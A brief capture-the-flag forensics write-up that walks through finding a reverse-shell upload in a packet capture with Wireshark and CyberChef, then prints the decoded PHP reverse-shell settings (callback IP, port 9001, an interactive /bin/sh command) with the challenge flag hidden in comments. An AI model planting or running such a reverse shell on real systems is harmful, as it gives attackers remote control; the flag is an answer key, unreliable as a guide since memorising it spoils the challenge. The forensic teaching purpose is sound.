1. Open .pcap in wireshark
2. Scroll thorugh the file to see that this is in fact an attack
3. Look for initial compromise with revshells due to the title and description of the task
4. A bit from the last packets there are only 1-2 POST requests, look at these 
5. In stream: `tcp.stream eq 3390` you can find the shell.
6. This will be URL encoded, decoder in Cyberchef and find: 

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.13.37.5';  // HSCTF{this_is_not
$port = 9001;       // _common_______right}
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```